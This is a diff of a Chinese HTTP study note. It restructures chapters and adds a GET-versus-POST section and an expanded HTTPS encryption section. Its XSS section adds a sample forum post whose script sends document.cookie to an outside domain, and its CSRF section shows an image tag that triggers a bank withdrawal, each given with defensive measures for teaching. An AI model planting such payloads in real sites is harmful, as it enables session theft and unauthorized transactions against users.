@@ -5,8 +5,8 @@
     * [请求和响应报文](#请求和响应报文)
 * [二、HTTP 方法](#二http-方法)
     * [GET](#get)
-    * [POST](#post)
     * [HEAD](#head)
+    * [POST](#post)
     * [PUT](#put)
     * [PATCH](#patch)
     * [DELETE](#delete)
@@ -27,8 +27,9 @@
     * [Cookie](#cookie)
     * [缓存](#缓存)
     * [持久连接](#持久连接)
+    * [管线化处理](#管线化处理)
     * [编码](#编码)
-    * [分块传输](#分块传输)
+    * [分块传输编码](#分块传输编码)
     * [多部分对象集合](#多部分对象集合)
     * [范围请求](#范围请求)
     * [内容协商](#内容协商)
@@ -41,10 +42,16 @@
 * [七、Web 攻击技术](#七web-攻击技术)
     * [攻击模式](#攻击模式)
     * [跨站脚本攻击](#跨站脚本攻击)
-    * [SQL 注入攻击](#sql-注入攻击)
     * [跨站点请求伪造](#跨站点请求伪造)
+    * [SQL 注入攻击](#sql-注入攻击)
     * [拒绝服务攻击](#拒绝服务攻击)
-* [八、各版本比较](#八各版本比较)
+* [八、GET 和 POST 的区别](#八get-和-post-的区别)
+    * [参数](#参数)
+    * [安全](#安全)
+    * [幂等性](#幂等性)
+    * [可缓存](#可缓存)
+    * [XMLHttpRequest](#xmlhttprequest)
+* [九、各版本比较](#九各版本比较)
     * [HTTP/1.0 与 HTTP/1.1 的区别](#http10-与-http11-的区别)
     * [HTTP/1.1 与 HTTP/2.0 的区别](#http11-与-http20-的区别)
 * [参考资料](#参考资料)
@@ -67,17 +74,17 @@
 
 URI 包含 URL 和 URN，目前 WEB 只有 URL 比较流行，所以见到的基本都是 URL。
 
-<div align="center"> <img src="../pics//4102b7d0-39b9-48d8-82ae-ac4addb7ebfb.jpg"/> </div><br>
+<div align="center"> <img src="../pics//f716427a-94f2-4875-9c86-98793cf5dcc3.jpg" width="400"/> </div><br>
 
 ## 请求和响应报文
 
 ### 1. 请求报文
 
-<div align="center"> <img src="../pics//22b39f77-ac47-4978-91ed-84aaf457644c.jpg"/> </div><br>
+<div align="center"> <img src="../pics//HTTP_RequestMessageExample.png" width=""/> </div><br>
 
 ### 2. 响应报文
 
-<div align="center"> <img src="../pics//00d8d345-cd4a-48af-919e-209d2788eca7.jpg"/> </div><br>
+<div align="center"> <img src="../pics//HTTP_ResponseMessageExample.png" width=""/> </div><br>
 
 # 二、HTTP 方法
 
@@ -89,28 +96,6 @@ URI 包含 URL 和 URN，目前 WEB 只有 URL 比较流行，所以见到的基
 
 当前网络请求中，绝大部分使用的是 GET 方法。
 
-## POST
-
-> 传输实体主体
-
-POST 主要目的不是获取资源，而是传输存储在内容实体中的数据。
-
-GET 和 POST 的请求都能使用额外的参数，但是 GET 的参数是以查询字符串出现在 URL 中，而 POST 的参数存储在内容实体。
-
-```
-GET /test/demo_form.asp?name1=value1&name2=value2 HTTP/1.1
-```
-
-```
-POST /test/demo_form.asp HTTP/1.1
-Host: w3schools.com
-name1=value1&name2=value2
-```
-
-GET 的传参方式相比于 POST 安全性较差，因为 GET 传的参数在 URL 中是可见的，可能会泄露私密信息。并且 GET 只支持 ASCII 字符，如果参数为中文则可能会出现乱码，而 POST 支持标准字符集。
-
-GET 和 POST 的另一个区别是，使用 GET 方法，浏览器会把 HTTP Header 和 Data 一并发送出去，服务器响应 200（OK）并返回数据。而使用 POST 方法，浏览器先发送 Header，服务器响应 100（Continue）之后，浏览器再发送 Data，最后服务器响应 200（OK）并返回数据。
-
 ## HEAD
 
 > 获取报文首部
@@ -118,6 +103,14 @@ GET 和 POST 的另一个区别是，使用 GET 方法，浏览器会把 HTTP He
 和 GET 方法一样，但是不返回报文实体主体部分。
 
 主要用于确认 URL 的有效性以及资源更新的日期时间等。
+
+## POST
+
+> 传输实体主体
+
+POST 主要用来传输数据，而 GET 主要用来获取资源。
+
+更多 POST 与 GET 的比较请见第八章。
 
 ## PUT
 
@@ -172,13 +165,13 @@ DELETE /file.html HTTP/1.1
 
 > 要求用隧道协议连接代理
 
-要求在于代理服务器通信时建立隧道，使用 SSL（Secure Sokets Layer，安全套接字）和 TLS（Transport Layer Security，传输层安全）协议把通信内容加密后经网络隧道传输。
+要求在与代理服务器通信时建立隧道，使用 SSL（Secure Sockets Layer，安全套接层）和 TLS（Transport Layer Security，传输层安全）协议把通信内容加密后经网络隧道传输。
 
 ```html
 CONNECT www.example.com:443 HTTP/1.1
 ```
 
-<div align="center"> <img src="../pics//5994928c-3d2d-45bd-abb1-adc4f5f4d775.jpg"/> </div><br>
+<div align="center"> <img src="../pics//dc00f70e-c5c8-4d20-baf1-2d70014a97e3.jpg" width=""/> </div><br>
 
 ## TRACE
 
@@ -189,8 +182,6 @@ CONNECT www.example.com:443 HTTP/1.1
 发送请求时，在 Max-Forwards 首部字段中填入数值，每经过一个服务器就会减 1，当数值为 0 时就停止传输。
 
 通常不会使用 TRACE，并且它容易受到 XST 攻击（Cross-Site Tracing，跨站追踪），因此更不会去使用它。
-
-<div align="center"> <img src="../pics//c8637fd2-3aaa-46c4-b7d9-f24d3fa04781.jpg"/> </div><br>
 
 # 三、HTTP 状态码
 
@@ -203,6 +194,10 @@ CONNECT www.example.com:443 HTTP/1.1
 | 3XX | Redirection（重定向状态码） | 需要进行附加操作以完成请求 |
 | 4XX | Client Error（客户端错误状态码） | 服务器无法处理请求 |
 | 5XX | Server Error（服务器错误状态码） | 服务器处理请求出错 |
+
+### 1XX 信息
+
+-  **100 Continue** ：表明到目前为止都很正常，客户端可以继续发送请求或者忽略这个响应。
 
 ## 2XX 成功
 
@@ -220,9 +215,9 @@ CONNECT www.example.com:443 HTTP/1.1
 
 -  **303 See Other** ：和 302 有着相同的功能，但是 303 明确要求客户端应该采用 GET 方法获取资源。
 
-- 注：虽然 HTTP 协议规定 301、302 状态下重定向时不允许把 POST 方法改成 GET 方法，但是大多数浏览器都会 在 301、302 和 303 状态下的重定向把 POST 方法改成 GET 方法。
+- 注：虽然 HTTP 协议规定 301、302 状态下重定向时不允许把 POST 方法改成 GET 方法，但是大多数浏览器都会在 301、302 和 303 状态下的重定向把 POST 方法改成 GET 方法。
 
--  **304 Not Modified** ：如果请求报文首部包含一些条件，例如：If-Match，If-ModifiedSince，If-None-Match，If-Range，If-Unmodified-Since，但是不满足条件，则服务器会返回 304 状态码。
+-  **304 Not Modified** ：如果请求报文首部包含一些条件，例如：If-Match，If-ModifiedSince，If-None-Match，If-Range，If-Unmodified-Since，如果不满足条件，则服务器会返回 304 状态码。
 
 -  **307 Temporary Redirect** ：临时重定向，与 302 的含义类似，但是 307 要求浏览器不会把重定向请求的 POST 方法改成 GET 方法。
 
@@ -231,8 +226,6 @@ CONNECT www.example.com:443 HTTP/1.1
 -  **400 Bad Request** ：请求报文中存在语法错误。
 
 -  **401 Unauthorized** ：该状态码表示发送的请求需要有认证信息（BASIC 认证、DIGEST 认证）。如果之前已进行过一次请求，则表示用户认证失败。
-
-<div align="center"> <img src="../pics//b1b4cf7d-c54a-4ff1-9741-cd2eea331123.jpg"/> </div><br>
 
 -  **403 Forbidden** ：请求被拒绝，服务器端没有必要给出拒绝的详细理由。
 
@@ -323,7 +316,7 @@ CONNECT www.example.com:443 HTTP/1.1
 
 HTTP 协议是无状态的，主要是为了让 HTTP 协议尽可能简单，使得它能够处理大量事务。HTTP/1.1 引入 Cookie 来保存状态信息。
 
-Cookie 是服务器发送给客户端的数据，该数据会被保存在浏览器中，并且在下一次发送请求时包含该数据。通过 Cookie 可以让服务器知道两个请求是否来自于同一个客户端，从而实现保持登录状态等功能。
+Cookie 是服务器发送给客户端的数据，该数据会被保存在浏览器中，并且客户端的下一次请求报文会包含该数据。通过 Cookie 可以让服务器知道两个请求是否来自于同一个客户端，从而实现保持登录状态等功能。
 
 ### 1. 创建过程
 
@@ -346,7 +339,16 @@ Host: www.example.org
 Cookie: yummy_cookie=choco; tasty_cookie=strawberry
 ```
 
-### 2. Set-Cookie
+### 2. 分类
+
+- 会话期 Cookie：浏览器关闭之后它会被自动删除，也就是说它仅在会话期内有效。
+- 持久性 Cookie：指定一个特定的过期时间（Expires）或有效期（Max-Age）之后就成为了持久性的 Cookie。
+
+```html
+Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT;
+```
+
+### 3. Set-Cookie
 
 | 属性 | 说明 |
 | :--: | -- |
@@ -354,20 +356,22 @@ Cookie: yummy_cookie=choco; tasty_cookie=strawberry
 | expires=DATE | Cookie 的有效期（若不明确指定则默认为浏览器关闭前为止） |
 | path=PATH | 将服务器上的文件目录作为 Cookie 的适用对象（若不指定则默认为文档所在的文件目录） |
 | domain=域名 | 作为 Cookie 适用对象的域名（若不指定则默认为创建 Cookie 的服务器的域名） |
-| Secure | 仅在 HTTPS 安全通信时才会发送 Cookie |
+| Secure | 仅在 HTTPs 安全通信时才会发送 Cookie |
 | HttpOnly | 加以限制，使 Cookie 不能被 JavaScript 脚本访问 |
 
-### 3. Session 和 Cookie 区别
+### 4. Session 和 Cookie 区别
 
-Session 是服务器用来跟踪用户的一种手段，每个 Session 都有一个唯一标识：Session ID。当服务器创建了一个 Session 时，给客户端发送的响应报文就包含了 Set-Cookie 字段，其中有一个名为 sid 的键值对，这个键值对就是 Session ID。客户端收到后就把 Cookie 保存在浏览器中，并且之后发送的请求报文都包含 Session ID。HTTP 就是通过 Session 和 Cookie 这两种方式一起合作来实现跟踪用户状态的，Session 用于服务器端，Cookie 用于客户端。
+Session 是服务器用来跟踪用户的一种手段，每个 Session 都有一个唯一标识：Session ID。当服务器创建了一个 Session 时，给客户端发送的响应报文包含了 Set-Cookie 字段，其中有一个名为 sid 的键值对，这个键值对就是 Session ID。客户端收到后就把 Cookie 保存在浏览器中，并且之后发送的请求报文都包含 Session ID。HTTP 就是通过 Session 和 Cookie 这两种方式一起合作来实现跟踪用户状态的，Session 用于服务器端，Cookie 用于客户端。
 
-### 4. 浏览器禁用 Cookie 的情况
+### 5. 浏览器禁用 Cookie 的情况
 
 会使用 URL 重写技术，在 URL 后面加上 sid=xxx 。
 
-### 5. 使用 Cookie 实现用户名和密码的自动填写
+### 6. 使用 Cookie 实现用户名和密码的自动填写
 
 网站脚本会自动从保存在浏览器中的 Cookie 读取用户名和密码，从而实现自动填写。
+
+但是如果 Set-Cookie 指定了 HttpOnly 属性，就无法通过 Javascript 脚本获取 Cookie 信息，这是出于安全性考虑。
 
 ## 缓存
 
@@ -413,21 +417,21 @@ Expires 字段也可以用于告知缓存服务器该资源什么时候会过期
 
 当浏览器访问一个包含多张图片的 HTML 页面时，除了请求访问 HTML 页面资源，还会请求图片资源，如果每进行一次 HTTP 通信就要断开一次 TCP 连接，连接建立和断开的开销会很大。持久连接只需要建立一次 TCP 连接就能进行多次 HTTP 通信。
 
-<div align="center"> <img src="../pics//c73a0b78-5f46-4d2d-a009-dab2a999b5d8.jpg"/> </div><br>
+<div align="center"> <img src="../pics//450px-HTTP_persistent_connection.svg.png" width=""/> </div><br>
 
 持久连接需要使用 Connection 首部字段进行管理。HTTP/1.1 开始 HTTP 默认是持久化连接的，如果要断开 TCP 连接，需要由客户端或者服务器端提出断开，使用 Connection : close；而在 HTTP/1.1 之前默认是非持久化连接的，如果要维持持续连接，需要使用 Connection : Keep-Alive。
 
-**管线化方式**  可以同时发送多个请求和响应，而不需要发送一个请求然后等待响应之后再发下一个请求。
+## 管线化处理
 
-<div align="center"> <img src="../pics//6943e2af-5a70-4004-8bee-b33d60f39da3.jpg"/> </div><br>
+HTTP/1.1 支持管线化处理，可以同时发送多个请求和响应，而不需要发送一个请求然后等待响应之后再发下一个请求。
 
 ## 编码
 
 编码（Encoding）主要是为了对实体进行压缩。常用的编码有：gzip、compress、deflate、identity，其中 identity 表示不执行压缩的编码格式。
 
-## 分块传输
+## 分块传输编码
 
-分块传输（Chunked Transfer Coding）可以把数据分割成多块，让浏览器逐步显示页面。
+Chunked Transfer Coding，可以把数据分割成多块，让浏览器逐步显示页面。
 
 ## 多部分对象集合
 
@@ -454,7 +458,7 @@ Content-Type: text/plain
 
 如果网络出现中断，服务器只发送了一部分数据，范围请求使得客户端能够只请求未发送的那部分数据，从而避免服务器端重新发送所有数据。
 
-在请求报文首部中添加 Range 字段，然后指定请求的范围，例如 Range:bytes=5001-10000。请求成功的话服务器发送 206 Partial Content 状态。
+在请求报文首部中添加 Range 字段指定请求的范围，请求成功的话服务器发送 206 Partial Content 状态。
 
 ```html
 GET /z4d4kWk.jpg HTTP/1.1
@@ -478,7 +482,9 @@ Content-Length: 1024
 
 ## 虚拟主机
 
-使用虚拟主机技术，使得一台服务器拥有多个域名，并且在逻辑上可以看成多个服务器。
+HTTP/1.1 使用虚拟主机技术，使得一台服务器拥有多个域名，并且在逻辑上可以看成多个服务器。
+
+使用 Host 首部字段进行处理。
 
 ## 通信数据转发
 
@@ -486,23 +492,21 @@ Content-Length: 1024
 
 代理服务器接受客户端的请求，并且转发给其它服务器。
 
-代理服务器一般是透明的，不会改变 URL。
-
 使用代理的主要目的是：缓存、网络访问控制以及访问日志记录。
 
-<div align="center"> <img src="../pics//c07035c3-a9ba-4508-8e3c-d8ae4c6ee9ee.jpg"/> </div><br>
+代理服务器分为正向代理和反向代理两种，用户察觉得到正向代理的存在，而反向代理一般位于内部网络中，用户察觉不到。
+
+<div align="center"> <img src="../pics//a314bb79-5b18-4e63-a976-3448bffa6f1b.png" width=""/> </div><br>
+
+<div align="center"> <img src="../pics//2d09a847-b854-439c-9198-b29c65810944.png" width=""/> </div><br>
 
 ### 2. 网关
 
 与代理服务器不同的是，网关服务器会将 HTTP 转化为其它协议进行通信，从而请求其它非 HTTP 服务器的服务。
 
-<div align="center"> <img src="../pics//81375888-6be1-476f-9521-42eea3e3154f.jpg"/> </div><br>
-
 ### 3. 隧道
 
-使用 SSL 等加密手段，为客户端和服务器之间建立一条安全的通信线路。
-
-<div align="center"> <img src="../pics//64b95403-d976-421a-8b45-bac89c0b5185.jpg"/> </div><br>
+使用 SSL 等加密手段，为客户端和服务器之间建立一条安全的通信线路。隧道本身不去解析 HTTP 请求。
 
 # 六、HTTPs
 
@@ -512,17 +516,37 @@ HTTP 有以下安全性问题：
 2. 不验证通信方的身份，通信方的身份有可能遭遇伪装；
 3. 无法证明报文的完整性，报文有可能遭篡改。
 
-HTTPs 并不是新协议，而是 HTTP 先和 SSL（Secure Socket Layer）通信，再由 SSL 和 TCP 通信。通过使用 SSL，HTTPs 提供了加密、认证和完整性保护。
+HTTPs 并不是新协议，而是 HTTP 先和 SSL（Secure Sockets Layer）通信，再由 SSL 和 TCP 通信。也就是说使用了隧道进行通信。
+
+通过使用 SSL，HTTPs 具有了加密、认证和完整性保护。
+
+<div align="center"> <img src="../pics//ssl-offloading.jpg" width="700"/> </div><br>
 
 ## 加密
 
-有两种加密方式：对称密钥加密和公开密钥加密。对称密钥加密的加密和解密使用同一密钥，而公开密钥加密使用一对密钥用于加密和解密，分别为公开密钥和私有密钥。公开密钥所有人都可以获得，通信发送方获得接收方的公开密钥之后，就可以使用公开密钥进行加密，接收方收到通信内容后使用私有密钥解密。
+### 1. 对称密钥加密
 
-对称密钥加密的缺点：无法安全传输密钥；公开密钥加密的缺点：相对来说更耗时。
+Symmetric-Key Encryption，加密的加密和解密使用同一密钥。
 
-HTTPs 采用  **混合的加密机制** ，使用公开密钥加密用于传输对称密钥，之后使用对称密钥加密进行通信。（下图中，共享密钥即对称密钥）
+- 优点：运算速度快；
+- 缺点：密钥容易被获取。
 
-<div align="center"> <img src="../pics//110b1a9b-87cd-45c3-a21d-824623715b33.jpg"/> </div><br>
+<div align="center"> <img src="../pics//scrypt.gif" width=""/> </div><br>
+
+### 2. 公开密钥加密
+
+Public-Key Encryption，使用一对密钥用于加密和解密，分别为公开密钥和私有密钥。公开密钥所有人都可以获得，通信发送方获得接收方的公开密钥之后，就可以使用公开密钥进行加密，接收方收到通信内容后使用私有密钥解密。
+
+- 优点：更为安全；
+- 缺点：运算速度慢；
+
+<div align="center"> <img src="../pics//pcrypt.gif" width=""/> </div><br>
+
+### 3. HTTPs 采用的加密方式
+
+HTTPs 采用混合的加密机制，使用公开密钥加密用于传输对称密钥，之后使用对称密钥加密进行通信。（下图中的 Session Key 就是对称密钥）
+
+<div align="center"> <img src="../pics//How-HTTPS-Works.png" width="600"/> </div><br>
 
 ## 认证
 
@@ -532,17 +556,15 @@ HTTPs 采用  **混合的加密机制** ，使用公开密钥加密用于传输�
 
 进行 HTTPs 通信时，服务器会把证书发送给客户端，客户端取得其中的公开密钥之后，先进行验证，如果验证通过，就可以开始通信。
 
-除了上诉提到的服务器端证书之外，还有客户端证书，客户端证书的目的就是让服务器对客户端进行验证。客户端证书需要用户自行安装，只有在业务需要非常高的安全性时才使用客户端证书，例如网上银行。
+<div align="center"> <img src="../pics//mutualssl_small.png" width=""/> </div><br>
 
 使用 OpenSSL 这套开源程序，每个人都可以构建一套属于自己的认证机构，从而自己给自己颁发服务器证书。浏览器在访问该服务器时，会显示“无法确认连接安全性”或“该网站的安全证书存在问题”等警告消息。
 
 ## 完整性
 
-SSL 提供摘要功能来验证完整性。
+SSL 提供报文摘要功能来验证完整性。
 
 # 七、Web 攻击技术
-
-Web 攻击的主要目标是使用 HTTP 协议的 Web 应用。
 
 ## 攻击模式
 
@@ -552,13 +574,27 @@ Web 攻击的主要目标是使用 HTTP 协议的 Web 应用。
 
 ### 2. 被动攻击
 
-设下圈套，让用户发送有攻击代码的 HTTP 请求，那么用户发送了该 HTTP 请求之后就会泄露 Cookie 等个人信息，具有代表性的有跨站脚本攻击和跨站请求伪造。
+设下圈套，让用户发送有攻击代码的 HTTP 请求，用户会泄露 Cookie 等个人信息，具有代表性的有跨站脚本攻击和跨站请求伪造。
 
 ## 跨站脚本攻击
 
 ### 1. 概念
 
-（Cross-Site Scripting, XSS），可以将代码注入到用户浏览的网页上，这种代码包含 HTML 和 JavaScript。通过利用网页开发时留下的漏洞，通过巧妙的方法注入恶意指令代码到网页，使用户加载并执行攻击者恶意制造的网页程序。攻击成功后，攻击者可能得到更高的权限（如执行一些操作）、私密网页内容、会话和 Cookie 等各种内容。
+跨站脚本攻击（Cross-Site Scripting, XSS），可以将代码注入到用户浏览的网页上，这种代码包括 HTML 和 JavaScript。利用网页开发时留下的漏洞，通过巧妙的方法注入恶意指令代码到网页，使用户加载并执行攻击者恶意制造的网页程序。攻击成功后，攻击者可能得到更高的权限（如执行一些操作）、私密网页内容、会话和 Cookie 等各种内容。
+
+例如有一个论坛网站，攻击者可以在上面发表以下内容：
+
+```html
+<script>location.href="//domain.com/?c=" + document.cookie</script>
+```
+
+之后该内容可能会被渲染成以下形式：
+
+```html
+<p><script>location.href="//domain.com/?c=" + document.cookie</script></p>
+```
+
+另一个用户浏览了含有这个内容的页面将会跳往 domain.com 并携带了当前作用域的 Cookie。如果这个论坛网站通过 Cookie 管理用户登录状态，那么攻击者就可以通过这个 Cookie 登录被攻击者的账号了。
 
 ### 2. 危害
 
@@ -568,7 +604,7 @@ Web 攻击的主要目标是使用 HTTP 协议的 Web 应用。
 
 ### 3. 防范手段
 
-**（一）过滤特殊字符** 
+（一）过滤特殊字符
 
 许多语言都提供了对 HTML 的过滤：
 
@@ -577,7 +613,7 @@ Web 攻击的主要目标是使用 HTTP 协议的 Web 应用。
 - Java 的 xssprotect (Open Source Library)。
 - Node.js 的 node-validator。
 
-**（二）指定 HTTP 的 Content-Type** 
+（二）指定 HTTP 的 Content-Type
 
 通过这种方式，可以避免内容被当成 HTML 解析，比如 PHP 语言可以使用以下代码：
 
@@ -586,6 +622,44 @@ Web 攻击的主要目标是使用 HTTP 协议的 Web 应用。
    header('Content-Type: text/javascript; charset=utf-8');
 ?>
 ```
+
+## 跨站点请求伪造
+
+### 1. 概念
+
+跨站点请求伪造（Cross-site request forgery，CSRF），是攻击者通过一些技术手段欺骗用户的浏览器去访问一个自己曾经认证过的网站并执行一些操作（如发邮件，发消息，甚至财产操作如转账和购买商品）。由于浏览器曾经认证过，所以被访问的网站会认为是真正的用户操作而去执行。这利用了 Web 中用户身份验证的一个漏洞：简单的身份验证只能保证请求发自某个用户的浏览器，却不能保证请求本身是用户自愿发出的。
+
+XSS 利用的是用户对指定网站的信任，CSRF 利用的是网站对用户网页浏览器的信任。
+
+假如一家银行用以执行转账操作的 URL 地址如下：
+
+```
+http://www.examplebank.com/withdraw?account=AccoutName&amount=1000&for=PayeeName。
+```
+
+那么，一个恶意攻击者可以在另一个网站上放置如下代码：
+
+```
+<img src="http://www.examplebank.com/withdraw?account=Alice&amount=1000&for=Badman">。
+```
+
+如果有账户名为 Alice 的用户访问了恶意站点，而她之前刚访问过银行不久，登录信息尚未过期，那么她就会损失 1000 资金。
+
+这种恶意的网址可以有很多种形式，藏身于网页中的许多地方。此外，攻击者也不需要控制放置恶意网址的网站。例如他可以将这种地址藏在论坛，博客等任何用户生成内容的网站中。这意味着如果服务器端没有合适的防御措施的话，用户即使访问熟悉的可信网站也有受攻击的危险。
+
+透过例子能够看出，攻击者并不能通过 CSRF 攻击来直接获取用户的账户控制权，也不能直接窃取用户的任何信息。他们能做到的，是欺骗用户浏览器，让其以用户的名义执行操作。
+
+### 2. 防范手段
+
+（一）检查 Referer 字段
+
+HTTP 头中有一个 Referer 字段，这个字段用以标明请求来源于哪个地址。在处理敏感数据请求时，通常来说，Referer 字段应和请求的地址位于同一域名下。
+
+这种办法简单易行，工作量低，仅需要在关键访问处增加一步校验。但这种办法也有其局限性，因其完全依赖浏览器发送正确的 Referer 字段。虽然 HTTP 协议对此字段的内容有明确的规定，但并无法保证来访的浏览器的具体实现，亦无法保证浏览器没有安全漏洞影响到此字段。并且也存在攻击者攻击某些浏览器，篡改其 Referer 字段的可能。
+
+（二）添加校验 Token
+
+由于 CSRF 的本质在于攻击者欺骗用户去访问自己设置的地址，所以如果要求在访问敏感数据请求时，要求用户浏览器提供不保存在 cookie 中，并且攻击者无法伪造的数据作为校验，那么攻击者就无法再执行 CSRF 攻击。这种数据通常是表单中的一个数据项。服务器将其生成并附加在表单中，其内容是一个伪乱数。当客户端通过表单提交请求时，这个伪乱数也一并提交上去以供校验。正常的访问时，客户端浏览器能够正确得到并传回这个伪乱数，而通过 CSRF 传来的欺骗性攻击中，攻击者无从事先得知这个伪乱数的值，服务器端就会因为校验 token 的值为空或者错误，拒绝这个可疑请求。
 
 ## SQL 注入攻击
 
@@ -637,36 +711,6 @@ strSQL = "SELECT * FROM users;"
 - 其他，使用其他更安全的方式连接 SQL 数据库。例如已修正过 SQL 注入问题的数据库连接组件，例如 ASP.NET 的 SqlDataSource 对象或是 LINQ to SQL。
 - 使用 SQL 防注入系统。
 
-## 跨站点请求伪造
-
-### 1. 概念
-
-（Cross-site request forgery，XSRF），是攻击者通过一些技术手段欺骗用户的浏览器去访问一个自己曾经认证过的网站并执行一些操作（如发邮件，发消息，甚至财产操作如转账和购买商品）。由于浏览器曾经认证过，所以被访问的网站会认为是真正的用户操作而去执行。这利用了 Web 中用户身份验证的一个漏洞：简单的身份验证只能保证请求发自某个用户的浏览器，却不能保证请求本身是用户自愿发出的。
-
-XSS 利用的是用户对指定网站的信任，CSRF 利用的是网站对用户网页浏览器的信任。
-
-假如一家银行用以执行转账操作的 URL 地址如下：`http://www.examplebank.com/withdraw?account=AccoutName&amount=1000&for=PayeeName`。
-
-<div align="center"> 那么，一个恶意攻击者可以在另一个网站上放置如下代码：`<img src="http://www.examplebank.com/withdraw?account=Alice&amount=1000&for=Badman">`。 </div><br>
-
-如果有账户名为 Alice 的用户访问了恶意站点，而她之前刚访问过银行不久，登录信息尚未过期，那么她就会损失 1000 资金。
-
-这种恶意的网址可以有很多种形式，藏身于网页中的许多地方。此外，攻击者也不需要控制放置恶意网址的网站。例如他可以将这种地址藏在论坛，博客等任何用户生成内容的网站中。这意味着如果服务器端没有合适的防御措施的话，用户即使访问熟悉的可信网站也有受攻击的危险。
-
-透过例子能够看出，攻击者并不能通过 CSRF 攻击来直接获取用户的账户控制权，也不能直接窃取用户的任何信息。他们能做到的，是欺骗用户浏览器，让其以用户的名义执行操作。
-
-### 2. 防范手段
-
-**（一）检查 Referer 字段** 
-
-HTTP 头中有一个 Referer 字段，这个字段用以标明请求来源于哪个地址。在处理敏感数据请求时，通常来说，Referer 字段应和请求的地址位于同一域名下。
-
-这种办法简单易行，工作量低，仅需要在关键访问处增加一步校验。但这种办法也有其局限性，因其完全依赖浏览器发送正确的 Referer 字段。虽然 HTTP 协议对此字段的内容有明确的规定，但并无法保证来访的浏览器的具体实现，亦无法保证浏览器没有安全漏洞影响到此字段。并且也存在攻击者攻击某些浏览器，篡改其 Referer 字段的可能。
-
-**（二）添加校验 Token** 
-
-由于 CSRF 的本质在于攻击者欺骗用户去访问自己设置的地址，所以如果要求在访问敏感数据请求时，要求用户浏览器提供不保存在 cookie 中，并且攻击者无法伪造的数据作为校验，那么攻击者就无法再执行 CSRF 攻击。这种数据通常是表单中的一个数据项。服务器将其生成并附加在表单中，其内容是一个伪乱数。当客户端通过表单提交请求时，这个伪乱数也一并提交上去以供校验。正常的访问时，客户端浏览器能够正确得到并传回这个伪乱数，而通过 CSRF 传来的欺骗性攻击中，攻击者无从事先得知这个伪乱数的值，服务器端就会因为校验 token 的值为空或者错误，拒绝这个可疑请求。
-
 ## 拒绝服务攻击
 
 ### 1. 概念
@@ -677,17 +721,91 @@ HTTP 头中有一个 Referer 字段，这个字段用以标明请求来源于哪
 
 > [维基百科：拒绝服务攻击](https://zh.wikipedia.org/wiki/%E9%98%BB%E6%96%B7%E6%9C%8D%E5%8B%99%E6%94%BB%E6%93%8A)
 
-# 八、各版本比较
+# 八、GET 和 POST 的区别
+
+## 参数
+
+GET 和 POST 的请求都能使用额外的参数，但是 GET 的参数是以查询字符串出现在 URL 中，而 POST 的参数存储在内容实体。
+
+GET 的传参方式相比于 POST 安全性较差，因为 GET 传的参数在 URL 中是可见的，可能会泄露私密信息。并且 GET 只支持 ASCII 字符，如果参数为中文则可能会出现乱码，而 POST 支持标准字符集。
+
+```
+GET /test/demo_form.asp?name1=value1&name2=value2 HTTP/1.1
+```
+
+```
+POST /test/demo_form.asp HTTP/1.1
+Host: w3schools.com
+name1=value1&name2=value2
+```
+
+## 安全
+
+安全的 HTTP 方法不会改变服务器状态，也就是说它只是可读的。
+
+GET 方法是安全的，而 POST 却不是。
+
+安全的方法除了 GET 之外还有：HEAD、OPTIONS。
+
+不安全的方法除了 POST 之外还有 PUT、DELETE。
+
+## 幂等性
+
+幂等的 HTTP 方法，同样的请求被执行一次与连续执行多次的效果是一样的，服务器的状态也是一样的。换句话说就是，幂等方法不应该具有副作用（统计用途除外）。在正确实现的条件下，GET，HEAD，PUT和 DELETE 等方法都是幂等的，而 POST 方法不是。所有的安全方法也都是幂等的。
+
+GET /pageX HTTP/1.1是幂等的。连续调用多次，客户端接收到的结果都是一样的：
+
+```
+GET /pageX HTTP/1.1
+GET /pageX HTTP/1.1
+GET /pageX HTTP/1.1
+GET /pageX HTTP/1.1
+```
+
+POST /add_row HTTP/1.1不是幂等的。如果调用多次，就会增加多行记录：
+
+```
+POST /add_row HTTP/1.1
+POST /add_row HTTP/1.1   -> Adds a 2nd row
+POST /add_row HTTP/1.1   -> Adds a 3rd row
+```
+
+DELETE /idX/delete HTTP/1.1是幂等的，即便是不同请求之间接收到的状态码不一样：
+
+```
+DELETE /idX/delete HTTP/1.1   -> Returns 200 if idX exists
+DELETE /idX/delete HTTP/1.1   -> Returns 404 as it just got deleted
+DELETE /idX/delete HTTP/1.1   -> Returns 404
+```
+
+## 可缓存
+
+如果要对响应进行缓存，需要满足以下条件：
+
+1. 请求报文的 HTTP 方法本身是可缓存的，包括 GET 和 HEAD，PUT 和 DELETE 不可缓存，POST 在多数情况下不可缓存的。
+2. 响应报文的 状态码是可缓存的，包括： 200, 203, 204, 206, 300, 301, 404, 405, 410, 414, and 501。
+3. 响应报文的 Cache-Control 首部字段没有指定不进行缓存。
+
+## XMLHttpRequest
+
+为了阐述 POST 和 GET 的另一个区别，需要先了解 XMLHttpRequest：
+
+> XMLHttpRequest 是一个 API，它为客户端提供了在客户端和服务器之间传输数据的功能。它提供了一个通过 URL 来获取数据的简单方式，并且不会使整个页面刷新。这使得网页只更新一部分页面而不会打扰到用户。XMLHttpRequest 在 AJAX 中被大量使用。
+
+在使用 XMLHttpRequest 的 POST 方法时，浏览器会先发送 Header 再发送 Data。但并不是所有浏览器会这么做，例如火狐就不会。
+
+# 九、各版本比较
 
 ## HTTP/1.0 与 HTTP/1.1 的区别
 
-HTTP/1.1 新增了以下内容：
+1. 持久连接
+2. 管线化处理
+3. 虚拟主机
+4. 状态码 100
+5. 分块传输编码
+6. 缓存处理字段
 
-- 默认为长连接；
-- 提供了范围请求功能；
-- 提供了虚拟主机的功能；
-- 多了一些缓存处理字段；
-- 多了一些状态码。
+具体内容见上文
 
 ## HTTP/1.1 与 HTTP/2.0 的区别
 
@@ -709,9 +827,22 @@ HTTP/1.1 的解析是基于文本的，而 HTTP/2.0 采用二进制格式。
 
 # 参考资料
 
-- [图解 HTTP](https://pan.baidu.com/s/1M0AHXqG9sP9Bxne6u0JK8A)
+- 上野宣. 图解 HTTP[M]. Ren min you dian chu ban she, 2014.
 - [MDN : HTTP](https://developer.mozilla.org/en-US/docs/Web/HTTP)
+- [Are http:// and www really necessary?](https://www.webdancers.com/are-http-and-www-necesary/)
+- [HTTP (HyperText Transfer Protocol)](https://www.ntu.edu.sg/home/ehchua/programming/webprogramming/HTTP_Basics.html)
+- [Web-VPN: Secure Proxies with SPDY & Chrome](https://www.igvita.com/2011/12/01/web-vpn-secure-proxies-with-spdy-chrome/)
+- [File:HTTP persistent connection.svg](http://en.wikipedia.org/wiki/File:HTTP_persistent_connection.svg)
